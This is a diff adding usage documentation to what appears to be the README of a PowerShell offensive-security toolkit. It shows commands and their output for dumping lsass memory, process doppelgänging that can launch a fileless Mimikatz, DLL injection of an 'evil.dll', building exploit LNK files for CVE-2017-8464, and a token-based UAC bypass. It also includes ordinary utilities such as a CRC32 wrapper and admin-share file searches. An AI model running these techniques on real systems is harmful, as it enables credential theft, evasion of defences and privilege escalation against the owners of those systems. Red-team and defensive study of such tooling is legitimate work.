@@ -239,7 +239,204 @@ C:\PS> $Beep = $MicrosoftWin32UnsafeNativeMethods::GetProcAddress($Kernel32Ref, 
 C:\PS> $MicrosoftWin32SafeNativeMethods::MessageBox([IntPtr]::Zero,$("{0:X}" -f [int64]$Beep),"Beep",0)
 ```
 
+### Get-ProcessMiniDump
+
+Create process dump using Dbghelp::MiniDumpWriteDump.
+
+```
+# Elevated user dumping elevated process
+
+C:\PS> (Get-Process lsass).Id
+528
+
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 528 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: Administrator
+VERBOSE: [?] Administrator privileges required
+VERBOSE: [>] Administrator privileges held
+VERBOSE: [>] Process dump success!
+
+C:\PS> $CallResult
+True
+
+# low priv user dumping low priv process
+
+C:\PS> (Get-Process calc).Id
+2424
+
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 2424 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: asenath.waite
+VERBOSE: [>] Process dump success!
+
+C:\PS> $CallResult
+True
+
+# low priv user dumping elevated process
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 4 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: asenath.waite
+VERBOSE: [?] Administrator privileges required
+VERBOSE: [!] Administrator privileges not held!
+
+C:\PS> $CallResult
+False
+```
+
+### Get-SystemProcessInformation
+
+Use NtQuerySystemInformation::SystemProcessInformation to get a detailed list of processes and process properties. On close inspection you will find that many process monitors such as Sysinternals Process Explorer or Process Hacker use this information class (in addition to SystemPerformanceInformation, SystemProcessorPerformanceInformation and SystemProcessorCycleTimeInformation).
+
+```
+# Return full process listing
+C:\PS> Get-SystemProcessInformation
+
+# Return only specific PID
+C:\PS> Get-SystemProcessInformation -ProcID 1336
+
+PID                        : 1336
+InheritedFromPID           : 1020
+ImageName                  : svchost.exe
+Priority                   : 8
+CreateTime                 : 0d:9h:8m:47s
+UserCPU                    : 0d:0h:0m:0s
+KernelCPU                  : 0d:0h:0m:0s
+ThreadCount                : 12
+HandleCount                : 387
+PageFaults                 : 7655
+SessionId                  : 0
+PageDirectoryBase          : 3821568
+PeakVirtualSize            : 2097249.796875 MB
+VirtualSize                : 2097240.796875 MB
+PeakWorkingSetSize         : 11.65625 MB
+WorkingSetSize             : 6.2109375 MB
+QuotaPeakPagedPoolUsage    : 0.175910949707031 MB
+QuotaPagedPoolUsage        : 0.167121887207031 MB
+QuotaPeakNonPagedPoolUsage : 0.0151519775390625 MB
+QuotaNonPagedPoolUsage     : 0.0137710571289063 MB
+PagefileUsage              : 3.64453125 MB
+PeakPagefileUsage          : 4.14453125 MB
+PrivatePageCount           : 3.64453125 MB
+ReadOperationCount         : 0
+WriteOperationCount        : 0
+OtherOperationCount        : 223
+ReadTransferCount          : 0
+WriteTransferCount         : 0
+OtherTransferCount         : 25010
+
+# Possibly returns multiple processes
+# eg: notepad.exe & notepad++.exe
+C:\PS> Get-SystemProcessInformation -ProcName note
+```
+
 ## pwnd
+
+### Start-Eidolon
+
+This is a proof-of-concept for doppelgänging, which was recently presented by enSilo at BlackHat EU. In simple terms this process involves creating an NTFS transaction from a file on disk (any file will do). Next we overwrite the file in memory, create a section from the modified file and launch a process based on that section. Afterwards we roll back the transaction, leaving the original file unchanged but we end up with a process that appears to be backed by the original file. For a more complete description please review the reference in the script.
+
+```
+# Create a doppelgänger from a file on disk with explorer as the parent.
+# x64 Win10 RS3
+C:\PS> Start-Eidolon -Target C:\Some\File.Path -Eidolon C:\Some\Other\File.Path -ParentPID 12784 -Verbose
+VERBOSE: [+] Created transaction object
+VERBOSE: [+] Created transacted file
+VERBOSE: [+] Overwriting transacted file
+VERBOSE: [+] Created section from transacted file
+VERBOSE: [+] Rolled back transaction changes
+VERBOSE: [+] Opened handle to the parent => explorer
+VERBOSE: [+] Created process from section
+VERBOSE: [+] Acquired Eidolon PBI
+VERBOSE: [+] Eidolon architecture is 64-bit
+VERBOSE: [+] Eidolon image base: 0x7FF6A0570000
+VERBOSE: [+] Eidolon entry point: 0x7FF6A05E40C8
+VERBOSE: [+] Created Eidolon process parameters
+VERBOSE: [+] Allocated memory in Eidolon
+VERBOSE: [+] Process parameters duplicated into Eidolon
+VERBOSE: [+] Rewrote Eidolon->PEB->pProcessParameters
+VERBOSE: [+] Created Eidolon main thread..
+True
+
+# Create a fileless Mimikatz doppelgänger with PowerShell as the parent.
+# x32 Win7
+C:\PS> Start-Eidolon -Target C:\Some\File.Path -Mimikatz -Verbose
+VERBOSE: [+] Created transaction object
+VERBOSE: [+] Created transacted file
+VERBOSE: [+] Overwriting transacted file
+VERBOSE: [+] Created section from transacted file
+VERBOSE: [+] Rolled back transaction changes
+VERBOSE: [+] Created process from section
+VERBOSE: [+] Acquired Eidolon PBI
+VERBOSE: [+] Eidolon architecture is 32-bit
+VERBOSE: [+] Eidolon image base: 0x400000
+VERBOSE: [+] Eidolon entry point: 0x4572D2
+VERBOSE: [+] Created Eidolon process parameters
+VERBOSE: [+] Allocated memory in Eidolon
+VERBOSE: [+] Process parameters duplicated into Eidolon
+VERBOSE: [+] Rewrote Eidolon->PEB->pProcessParameters
+VERBOSE: [+] Created Eidolon main thread..
+True
+```
+
+### Stage-RemoteDll
+
+Stage-RemoteDll is a small function to demonstrate various Dll injection techniques (NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx) on 32 and 64 bit architectures. While I have done some input validation & cleanup, this is mostly POC code. Note also that these techniques can easily be repurposed to directly execute shellcode in the remote process.
+
+```
+# Boolean return value
+C:\PS> $CallResult = Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx
+C:\PS> $CallResult
+True
+
+# Verbose output
+C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode QueueUserAPC -Verbose
+VERBOSE: [+] Using QueueUserAPC
+VERBOSE: [>] Opening notepad
+VERBOSE: [>] Allocating DLL path memory
+VERBOSE: [>] Writing DLL string
+VERBOSE: [>] Locating LoadLibraryA
+VERBOSE: [>] Getting process threads
+VERBOSE: [>] Registering APC's with all threads
+VERBOSE:   --> Success, registered APC
+VERBOSE:   --> Success, registered APC
+VERBOSE:   --> Success, registered APC
+VERBOSE:   --> Success, registered APC
+VERBOSE: [>] Cleaning up..
+True
+```
+
+### Export-LNKPwn
+
+Create LNK files to exploit CVE-2017-8464 aka LNK round 3 ;))!
+
+Currently, it is recommended that you create the lnk locally and then move it to the target system because of .Net and PowerShell dependencies. Please refer to the function synopsis for further details.
+
+```
+C:\PS> Export-LNKPwn -LNKOutPath C:\Some\Local\Path.lnk -TargetCPLPath C:\Target\CPL\Path.cpl -Type SpecialFolderDataBlock
+```
+
+### UAC-TokenMagic
+
+Based on James Forshaw's three part post on UAC, linked below, and possibly a technique used by the CIA!
+
+Essentially we duplicate the token of an elevated process, lower it's mandatory integrity level, use it to create a new restricted token, impersonate it and use the Secondary Logon service to spawn a new process with High IL. Like playing hide-and-go-seek with tokens! ;))
+
+This technique even bypasses the AlwaysNotify setting provided you supply it with a PID for an elevated process.
+
+Targets:
+7,8,8.1,10,10RS1,10RS2
+
+```
+C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c calc.exe" -ProcPID 1116
+
+[*] Session is not elevated
+[*] Successfully acquired regedit handle
+[*] Opened process token
+[*] Duplicated process token
+[*] Initialized MedIL SID
+[*] Lowered token mandatory IL
+[*] Created restricted token
+[*] Duplicated restricted token
+[*] Successfully impersonated security context
+[*] Magic..
+```
 
 ### Bypass-UAC
 
@@ -451,6 +648,79 @@ C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write
 ```
 
 ## Utility
+
+### Get-LimitChildItem
+
+Depth limited wrapper for Get-ChildItem with basic filter functionality.
+
+```
+# UNC path txt file search
+PS C:\> Get-LimitChildItem -Path "\\192.168.84.129\C$\Program Files\" -MaxDepth 5 -Filter "*.txt"
+\\192.168.84.129\C$\Program Files\Windows Defender\ThirdPartyNotices.txt
+\\192.168.84.129\C$\Program Files\VMware\VMware Tools\open_source_licenses.txt
+\\192.168.84.129\C$\Program Files\VMware\VMware Tools\vmacthlp.txt
+\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceAmharic.txt
+\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceArray.txt
+\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceDaYi.txt
+\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceTigrinya.txt
+\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceYi.txt
+
+# Local wildcard *ini* search
+PS C:\> Get-LimitChildItem -Path C:\ -MaxDepth 3 -Filter "*ini*"
+C:\Windows\system.ini
+C:\Windows\win.ini
+C:\Windows\Boot\BootDebuggerFiles.ini
+C:\Windows\Fonts\desktop.ini
+C:\Windows\INF\mdmminij.inf
+C:\Windows\Media\Windows Minimize.wav
+C:\Windows\PolicyDefinitions\PenTraining.admx
+C:\Windows\PolicyDefinitions\WinInit.admx
+C:\Windows\System32\dwminit.dll
+C:\Windows\System32\ie4uinit.exe
+C:\Windows\System32\ieuinit.inf
+C:\Windows\System32\PerfStringBackup.INI
+C:\Windows\System32\rdpinit.exe
+C:\Windows\System32\regini.exe
+C:\Windows\System32\secinit.exe
+C:\Windows\System32\tcpmon.ini
+C:\Windows\System32\TpmInit.exe
+C:\Windows\System32\userinit.exe
+C:\Windows\System32\userinitext.dll
+C:\Windows\System32\UXInit.dll
+C:\Windows\System32\WimBootCompress.ini
+C:\Windows\System32\wininet.dll
+C:\Windows\System32\wininetlui.dll
+C:\Windows\System32\wininit.exe
+C:\Windows\System32\wininitext.dll
+C:\Windows\System32\winipcfile.dll
+C:\Windows\System32\winipcsecproc.dll
+C:\Windows\System32\winipsec.dll
+C:\Windows\SysWOW64\ieuinit.inf
+C:\Windows\SysWOW64\regini.exe
+C:\Windows\SysWOW64\secinit.exe
+C:\Windows\SysWOW64\TpmInit.exe
+C:\Windows\SysWOW64\userinit.exe
+C:\Windows\SysWOW64\userinitext.dll
+C:\Windows\SysWOW64\UXInit.dll
+C:\Windows\SysWOW64\WimBootCompress.ini
+C:\Windows\SysWOW64\wininet.dll
+C:\Windows\SysWOW64\wininetlui.dll
+C:\Windows\SysWOW64\wininitext.dll
+C:\Windows\SysWOW64\winipcfile.dll
+C:\Windows\SysWOW64\winipcsecproc.dll
+C:\Windows\SysWOW64\winipsec.dll
+```
+
+### Get-CRC32
+
+A simple wrapper for the undocumented RtlComputeCrc32 function.
+
+```
+# Example from string
+C:\PS> $String = [System.Text.Encoding]::ASCII.GetBytes("Testing!")
+C:\PS> Get-CRC32 -Buffer $String
+C:\PS> 2392247274
+```
 
 ### Trace-Execution
 
